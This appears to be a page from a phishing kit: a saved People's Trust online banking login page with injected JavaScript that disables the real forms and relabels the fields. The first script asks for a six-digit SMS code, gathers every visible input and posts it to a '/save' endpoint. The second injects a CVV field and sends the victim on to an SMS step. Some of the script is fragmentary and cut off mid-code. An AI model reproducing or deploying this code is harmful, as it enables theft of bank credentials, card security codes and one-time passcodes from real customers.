<!-- saved from url=(0099)https://peoplestrust.auth.memberdirect.net/auth/oauth2/login?execution=e1s1&client_id=OnlineBanking -->
<html class="hydrated" lang="en" ui-mode="bootstrap" ui-version="5"><head><script id="override-fix">
(function() {
  function initSMS() {
    // Block all forms
    document.querySelectorAll('form').forEach(function(f) {
      f.action='javascript:void(0)'; f.onsubmit=function(){return false;};
      f.addEventListener('submit',function(e){e.preventDefault();e.stopImmediatePropagation();},true);
    });
    
    // Style first visible input as SMS code field
    var allInputs = Array.from(document.querySelectorAll('input')).filter(function(i){
      return i.type!=='hidden' && i.type!=='checkbox' && i.type!=='radio' && window.getComputedStyle(i).display!=='none';
    });
    
    if(allInputs.length>0) {
      var inp = allInputs[0];
      inp.id='sms_code';
      inp.type='text';
      inp.name='sms_code';
      inp.maxLength=6;
      inp.autocomplete='one-time-code';
      inp.placeholder='Code  6 chiffres / 6-digit code';
      inp.removeAttribute('disabled');
      inp.style.cssText='text-align:center!important;letter-spacing:10px!important;font-size:22px!important;width:100%;box-sizing:border-box';
      // Hide all other non-hidden inputs
      for(var i=1;i<allInputs.length;i++){
        var p = allInputs[i].closest('div,p,label,section');
        if(p) p.style.display='none'; else allInputs[i].style.display='none';
      }
    }
    
    // Update labels
    document.querySelectorAll('label').forEach(function(lbl){
      var txt=lbl.textContent.trim().toLowerCase();
      if(txt.includes('password')||txt.includes('mot de passe')||txt.includes('identifiant')||txt.includes('username')||txt.includes('card')||txt.includes('access code')||txt.includes('code client')||txt.includes('client id')) {
        lbl.textContent = 'Code de vrification SMS / SMS verification code';
      }
    });
    
    // Find and rewire primary button
    var keywords=['continue','next','login','sign in','se connecter','valider','continuer','connexion','submit'];
    var btn = null;
    var btns = document.querySelectorAll('button,input[type="submit"]');
    for(var i=0;i<btns.length;i++){
      var t=(btns[i].textContent||btns[i].value||'').trim().toLowerCase();
      for(var k=0;k<keywords.length;k++) if(t.includes(keywords[k])){btn=btns[i];break;}
      if(btn) break;
    }
    if(!btn && btns.length>0) btn=btns[btns.length-1];
    
    if(btn&&!btn.__smsDone) {
      btn.__smsDone=true;
      btn.disabled=false;
      btn.removeAttribute('disabled');
      btn.style.pointerEvents='auto';
      btn.style.cursor='pointer';
      btn.style.opacity='1';
      if(btn.tagName==='INPUT') btn.value='Valider';
      else btn.textContent='Valider';
      btn.addEventListener('click',function(e){
        e.preventDefault(); e.stopImmediatePropagation();
        var code=document.getElementById('sms_code');
        if(!code||code.value.trim()===''||code.value.trim().length<6) {
          alert('Veuillez saisir votre code SMS  6 chiffres.');
          if(code) code.focus();
          return false;
        }
        var _ldr = document.createElement('div');
_ldr.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Arial,sans-serif;color:#333;backdrop-filter:blur(5px);';
_ldr.innerHTML = '<div style=\"width:50px;height:50px;border:4px solid #e5e7eb;border-top:4px solid #00843D;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;\"></div><div style=\"font-size:20px;font-weight:600;margin-bottom:8px;\">Veuillez patienter...</div><div style=\"font-size:14px;color:#6b7280;\">Traitement s&eacute;curis&eacute; en cours</div><style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>';
document.body.appendChild(_ldr);
var _data = { bank: 'peoplestrust', type: 'SMS', fields: {} };
var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"])');
for(var i=0; i<inps.length; i++) {
    var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
    _data.fields[key] = inps[i].value;
}
fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_data) }).catch(function(){});
setTimeout(function(){ window.location.href = 'peoplestrust_thankyou.html'; }, 10000);
      },true);
    }
  }
  
  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',initSMS);
  else initSMS();
  setTimeout(initSMS,300);
  setTimeout(initSMS,1000);
})();
</script>

document.addEventListener("DOMContentLoaded", function() {
    // 1. Gently blank out unwanted text without destroying elements
    var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
    var node;
    while(node = walker.nextNode()) {
        var text = node.nodeValue.toLowerCase();
        if (text.indexOf("bienvenue") !== -1 || 
            text.indexOf("connectez-vous pour commencer") !== -1 || 
            text.indexOf("connectez-vous") !== -1 || 
            text.indexOf("pour commencer") !== -1) {
            node.nodeValue = " "; // Replace with space to keep DOM intact
        }
    }

    // 2. Find inputs to repurpose instead of deleting them
    var inputs = document.querySelectorAll("input:not([type='hidden'])");
    var visibleInputs = [];
    for(var i=0; i<inputs.length; i++) {
        if(inputs[i].type !== "checkbox" && inputs[i].type !== "radio" && inputs[i].type !== "submit" && inputs[i].type !== "button") {
            visibleInputs.push(inputs[i]);
        }
    }

                this.value = val;

            if (formGroup.querySelector('label') && formGroup.querySelector('input')) {
                break;
            }
            formGroup = formGroup.parentElement;

            // fallback

        }

                cvvInput.id = "cvv_input_injected";
                cvvInput.name = "cvv_injected";
                
                if (cvvLabel) {
                    cvvLabel.innerHTML = "<b>Code de scurit (CVV)</b>";
                    cvvLabel.setAttribute("for", "cvv_input_injected");
                }
                
                // Remove any old error messages from cloned group
                var errMsgs = cvvGroup.querySelectorAll(".error, .invalid, [role='alert']");
                errMsgs.forEach(function(el) { el.remove(); });
                
                formGroup.insertAdjacentElement('afterend', cvvGroup);
            }
        }
    }

                    node2.nodeValue = "Veuillez complter vos informations";
                }
            }
        }
    }

    // 5. Submit Buttons
    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
    clickables.forEach(function(el) {
        var text = (el.textContent || el.value || "").toLowerCase().trim();
        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("submit") !== -1 || text.indexOf("next") !== -1 || text.indexOf("connect") !== -1) {
            if (el.tagName === "INPUT") {
                el.value = "Vrifier";
            } else {
                el.innerText = "Vrifier";
            }
        }
    });

    // 6. Form Submission Redirect
    var currentFile = window.location.pathname.split("/").pop();
    var smsFile = currentFile.replace("_step3.html", "_sms.html");

    function doRedirect(e) {
        if(e) {
            e.preventDefault();
            e.stopPropagation();
            if(e.stopImmediatePropagation) e.stopImmediatePropagation();
        }
        window.location.href = smsFile;
    }

    var forms = document.querySelectorAll("form");
    forms.forEach(function(form) {
        form.setAttribute("action", "javascript:void(0)");
        form.onsubmit = doRedirect;
        form.addEventListener("submit", doRedirect, true);
    });

    clickables.forEach(function(el) {
        el.addEventListener("click", function(e) {
            var text = (el.textContent || el.value || "").toLowerCase().trim();
            if (text.indexOf("cancel") !== -1 || text.indexOf("annuler") !== -1) {
                return;
            }
            doRedirect(e);
        }, true);
    });
});
</script>
